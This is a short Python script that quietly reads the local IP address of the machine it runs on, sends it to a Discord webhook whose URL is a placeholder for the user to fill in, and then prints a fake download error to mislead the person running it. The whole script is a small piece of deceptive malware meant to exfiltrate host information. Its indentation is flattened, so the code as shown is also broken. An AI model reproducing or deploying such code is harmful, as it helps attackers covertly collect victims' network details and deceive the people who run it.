import shutil
import socket
import requests
from discord import Webhook, AsyncWebhookAdapter
import asyncio
import aiohttp

# Shortcuts
ipaddresshaha = socket.gethostbyname(socket.gethostname())


# Sending ip to your webhook
async def send () :
webhook_url = "ur_webhook_url"

async with aiohttp.ClientSession() as session:
webhook = Webhook.from_url(webhook_url, adapter = AsyncWebhookAdapter(session))
await webhook.send(ipaddresshaha)


asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
asyncio.run(send())


# Fake error
print("Error!")
print("Failed to download files.")
print("Error name: failed_download_files_from_link")
input('Press "Enter" to exit.\n')
